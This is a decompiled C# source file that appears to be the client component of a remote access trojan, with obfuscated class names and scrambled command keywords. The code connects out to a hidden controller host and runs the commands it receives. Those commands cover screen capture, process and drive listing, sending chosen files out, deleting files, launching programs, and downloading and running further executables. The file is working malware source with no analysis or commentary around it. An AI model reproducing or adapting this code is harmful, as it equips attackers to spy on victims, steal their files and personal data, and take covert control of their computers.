using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace hdrmiprcav;

public class MROIDM
{
	private ThreadStart obj_thread;

	public TcpClient main_socket;

	public bool is_breaks = false;

	private bool is_matchs = false;

	private bool rondoming = false;

	private EDIRARE obj_state = new EDIRARE();

	private MORLEINF user_account;

	private int desk_size = 210;

	private bool des_writer = false;

	private bool is_save_scren = false;

	public int port_index = 0;

	public NetworkStream net_stream;

	private int bufer_size = 1024;

	private DEROIVF hdi_drive = new DEROIVF();

	private int bytes_process = 0;

	public bool is_req_cancel = false;

	public DateTime pro_datetime;

	private Thread fun_thrwad;

	private MemoryStream scr_mem_stream = new MemoryStream();

	private SCILRNS scrn_caps = new SCILRNS();

	private Bitmap image;

	public void core_start()
	{
		DAEONIF.port = DAEONIF.ports[0];
		user_account = new MORLEINF();
		hdi_drive.core_svr = this;
		TimerCallback callback = proc_loop;
		Timer timer = new Timer(callback, obj_state, 38120, 56520);
		obj_state.timer = timer;
	}

	public void remove_account()
	{
		try
		{
			byte[] bytes = down_data();
			string text = DAEONIF.get_app_path() + DAEONIF.del_account + ".exe|".Split(new char[1] { '|' })[0];
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, bytes);
				Process.Start(text);
			}
		}
		catch
		{
		}
	}

	public NetworkStream net_str(TcpClient main_socket)
	{
		return main_socket.GetStream();
	}

	public void download_file(string file_path)
	{
		try
		{
			byte[] array = down_data();
			if (array != null)
			{
				File.WriteAllBytes(file_path, array);
			}
		}
		catch
		{
		}
	}

	private void process_core()
	{
		if (!is_matchs)
		{
			is_matchs = true;
			net_stream = net_str(main_socket);
			is_save_scren = false;
			while (is_breaks)
			{
				string[] procss_type = get_procss_type();
				if (procss_type == null)
				{
					is_breaks = false;
					break;
				}
				is_req_cancel = false;
				string text = procss_type[0].ToLower();
				if (text.Split(new char[1] { '-' }).Length > 1)
				{
					text = text.Split(new char[1] { '-' })[1];
				}
				switch (text.Insert(3, "7"))
				{
				case "gey7tavs":
				case "get7avs":
					obj_thread = delegate
					{
						machine_procss("geytavs");
					};
					fun_thrwad = new Thread(obj_thread);
					fun_thrwad.Start();
					break;
				case "thy7umb":
				case "thu7mb":
					images_details(procss_type[1]);
					break;
				case "pry7ocl":
				case "pro7cl":
					obj_thread = delegate
					{
						machine_procss("pryocl");
					};
					fun_thrwad = new Thread(obj_thread);
					fun_thrwad.Start();
					break;
				case "puy7tsrt":
				case "put7srt":
					save_apps();
					break;
				case "doy7wf":
				case "dow7f":
					download_file(procss_type[1]);
					break;
				case "scy7rsz":
				case "scr7sz":
					dsk_scrn_size(procss_type[1]);
					break;
				case "fiy7lsz":
				case "fil7sz":
					obj_thread = delegate
					{
						file_details(procss_type[1]);
					};
					fun_thrwad = new Thread(obj_thread);
					fun_thrwad.Start();
					break;
				case "cdc7rgn":
				case "csc7rgn":
				case "csd7crgn":
					seye_scren(procss_type[1]);
					break;
				case "sty7ops":
				case "sto7ps":
					is_save_scren = false;
					break;
				case "scu7ren":
				case "scr7en":
					is_save_scren = true;
					obj_thread = delegate
					{
						isy_desk_scren(procss_type[1]);
					};
					fun_thrwad = new Thread(obj_thread);
					fun_thrwad.Start();
					break;
				case "diy7rs":
				case "dir7s":
					fun_thrwad = new Thread(show_send_drives);
					fun_thrwad.Start();
					break;
				case "cny7ls":
				case "cnl7s":
					is_req_cancel = true;
					is_save_scren = false;
					break;
				case "dey7lt":
				case "del7t":
					tras_files(procss_type[1]);
					break;
				case "afy7ile":
				case "afi7le":
					obj_thread = delegate
					{
						seynd_auto(procss_type[1]);
					};
					fun_thrwad = new Thread(obj_thread);
					fun_thrwad.Start();
					break;
				case "udy7lt":
				case "udl7t":
					remove_account();
					break;
				case "liy7stf":
				case "lis7tf":
					obj_thread = delegate
					{
						hdi_drive.see_folders(procss_type[1]);
					};
					fun_thrwad = new Thread(obj_thread);
					fun_thrwad.Start();
					break;
				case "iny7fo":
				case "inf7o":
					account_infos();
					break;
				case "ruy7nf":
				case "run7f":
					try
					{
						Process.Start(procss_type[1].Split(new char[1] { '>' })[0]);
					}
					catch
					{
					}
					break;
				case "fiy7le":
				case "fil7e":
					obj_thread = delegate
					{
						move_files(procss_type[1]);
					};
					fun_thrwad = new Thread(obj_thread);
					fun_thrwad.Start();
					break;
				case "doy7wr":
				case "dow7r":
					download_file(procss_type[1]);
					break;
				case "fly7dr":
				case "fld7r":
				{
					string text3 = hdi_drive.exp_folder(procss_type[1]);
					if (text3 != "")
					{
						load_data(null, "flydr=|".Split(new char[1] { '|' })[0] + text3);
					}
					break;
				}
				case "fly7es":
				case "fle7s":
				{
					string text2 = hdi_drive.see_files(procss_type[1]);
					if (text2 != "")
					{
						load_data(null, "flyes=|".Split(new char[1] { '|' })[0] + text2);
					}
					break;
				}
				}
			}
			is_breaks = false;
			is_save_scren = false;
		}
		is_matchs = false;
	}

	public string file_details(string path, bool retn = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!retn) ? ">|".Split(new char[1] { '|' })[0] : "<|".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!retn) ? ">|".Split(new char[1] { '|' })[0] : "<|".Split(new char[1] { '|' })[0]);
			text = text + geyt_size(fileInfo.Length) + ((!retn) ? ">|".Split(new char[1] { '|' })[0] : "<|".Split(new char[1] { '|' })[0]);
			if (!retn)
			{
				load_data(null, "fiylsz=|".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void proc_loop(object obj_surce)
	{
		try
		{
			if (!rondoming)
			{
				rondoming = true;
				if (!is_breaks || !main_socket.Connected)
				{
					is_breaks = system_cons();
					if (is_breaks)
					{
						bufer_size = main_socket.ReceiveBufferSize;
						process_core();
					}
				}
			}
			rondoming = false;
		}
		catch
		{
			is_breaks = false;
			is_matchs = false;
			rondoming = false;
			des_writer = false;
		}
	}

	private bool system_cons()
	{
		try
		{
			DAEONIF.main_tp = DAEONIF.get_bytes_string(DAEONIF.main_cons);
			main_socket = new TcpClient();
			main_socket.Connect(DAEONIF.main_tp, DAEONIF.port);
			return true;
		}
		catch
		{
			port_index++;
			DAEONIF.port = DAEONIF.ports[port_index];
			if (port_index >= DAEONIF.ports.Length - 1)
			{
				port_index = 0;
			}
			return false;
		}
	}

	public bool seynd_auto(string file_info_str)
	{
		try
		{
			string[] array = file_info_str.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				file_info_str = file_info_str + ">" + fileName;
				load_data(data, "afyile=" + file_info_str);
				return false;
			}
			load_data(null, "anyfod=" + file_info_str);
			return false;
		}
		catch
		{
			return false;
		}
	}

	private void images_details(string path)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|".Split(new char[1] { '|' })[0];
				text = text + geyt_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				load_data(memoryStream.ToArray(), "thyumb=|".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	public void machine_procss(string types)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|".Split(new char[1] { '|' })[0];
				text += "0>|".Split(new char[1] { '|' })[0];
				text += "<";
			}
			byte[] data = DAEONIF.get_bytes_array(text);
			load_data(data, types + "=proyess|".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void save_apps()
	{
		try
		{
			DAEONIF.set_conup("width|".Split(new char[1] { '|' })[0], DAEONIF.my_path);
		}
		catch
		{
		}
	}

	private void seye_scren(string desk_scren_size)
	{
		try
		{
			desk_size = Convert.ToInt16(desk_scren_size.Split(new char[1] { '>' })[0].Trim());
			image = scrn_caps.desk_scren(desk_size);
			scr_mem_stream.SetLength(0L);
			((Image)image).Save((Stream)scr_mem_stream, ImageFormat.get_Jpeg());
			load_data(scr_mem_stream.ToArray(), "csdcrgn=|".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void isy_desk_scren(string desk_scren_size)
	{
		try
		{
			desk_size = Convert.ToInt16(desk_scren_size.Split(new char[1] { '>' })[0].Trim());
			while (is_save_scren && is_breaks)
			{
				image = scrn_caps.desk_scren(desk_size);
				scr_mem_stream.SetLength(0L);
				((Image)image).Save((Stream)scr_mem_stream, ImageFormat.get_Jpeg());
				load_data(scr_mem_stream.ToArray(), "scyren=|".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private string geyt_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|".Split(new char[1] { '|' })[0],
				"KB|".Split(new char[1] { '|' })[0],
				"MB|".Split(new char[1] { '|' })[0],
				"GB|".Split(new char[1] { '|' })[0],
				"TB|".Split(new char[1] { '|' })[0],
				"PB|".Split(new char[1] { '|' })[0],
				"EB|".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	private void account_infos()
	{
		string text = user_account.lan_info + "|" + user_account.com_name + "|" + user_account.acc_date_time + "|" + user_account.account_name + "|" + DAEONIF.ops_name() + "|" + user_account.rm_version + "|";
		text += "| !".Split(new char[1] { '!' })[0];
		text = text + "|" + user_account.account_opt;
		text = text + "|" + DAEONIF.get_app_path();
		byte[] data = DAEONIF.get_bytes_array(text);
		load_data(data, "inyfo=usder|".Split(new char[1] { '|' })[0]);
	}

	private void dsk_scrn_size(string sc_size)
	{
		try
		{
			string[] array = sc_size.Split(new char[1] { '>' });
			desk_size = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void move_files(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				load_data(File.ReadAllBytes(lfile), "fiyle=|".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void tras_files(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public bool load_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (des_writer)
			{
				return false;
			}
			des_writer = true;
			byte[] array = DAEONIF.get_bytes_array(type);
			int num = 0;
			int num2 = 5;
			byte[] array2 = null;
			if (data != null)
			{
				array2 = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(array.Length);
			byte[] array3 = new byte[num2 + array.Length + num];
			bytes.CopyTo(array3, 0);
			array.CopyTo(array3, 5);
			if (data != null)
			{
				array2.CopyTo(array3, 5 + array.Length);
				data.CopyTo(array3, 10 + array.Length);
			}
			int num3 = 0;
			int num4 = array3.Length;
			while (num4 > 0 && !is_req_cancel)
			{
				int num5 = ((num4 > bufer_size) ? bufer_size : num4);
				net_stream.Write(array3, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			des_writer = false;
			if (is_req_cancel)
			{
				return false;
			}
			return true;
		}
		catch
		{
			des_writer = false;
			is_breaks = false;
			return false;
		}
	}

	public byte[] down_data()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			bytes_process = net_stream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !is_req_cancel)
			{
				int count = ((num3 > bufer_size) ? bufer_size : num3);
				bytes_process = net_stream.Read(array2, num, count);
				num += bytes_process;
				num3 -= bytes_process;
			}
			if (is_req_cancel)
			{
				net_stream.Flush();
				while (net_stream.DataAvailable && net_stream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			is_breaks = false;
			return null;
		}
	}

	public string[] get_procss_type()
	{
		try
		{
			byte[] array = new byte[5];
			bytes_process = net_stream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= bytes_process)
			{
				int count = ((num3 > bufer_size) ? bufer_size : num3);
				bytes_process = net_stream.Read(array2, num2, count);
				num2 += bytes_process;
			}
			string text = DAEONIF.get_bytes_string(array2);
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			is_breaks = false;
			return null;
		}
	}

	private void show_send_drives()
	{
		string text = hdi_drive.lookup_drive();
		load_data(null, "diyrs=" + text);
	}
}
